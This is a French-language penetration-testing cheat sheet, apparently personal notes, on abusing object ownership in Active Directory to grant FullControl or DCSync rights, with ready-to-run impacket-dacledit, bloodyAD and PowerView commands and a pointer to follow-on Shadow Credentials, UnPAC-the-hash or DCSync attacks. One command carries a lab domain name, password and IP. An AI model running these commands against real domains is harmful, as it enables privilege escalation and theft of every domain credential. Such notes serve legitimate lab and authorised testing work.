

> [!Prérequis]
> L'utilisateur doit être propriétaire de l'objet

> [!TIP]
> Une fois les droits octroyés, GO #ShadowCredentials + #UnPACTheHash ou #DCSync

- Droits FullControl
- Droits DCSync

# FullControl

## LINUX
### *Impacket*

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
```

Inheritence sur une OU

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN"/"$USER":"$PASSWORD"
```

### *BloodyAD*

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```


## WINDOWS

### PowerView

```powershell
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```


---

# DCSync

## LINUX

### *Impacket*

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```


### *BloodyAD*

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
```


## WINDOWS

### PowerView

```powershell
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```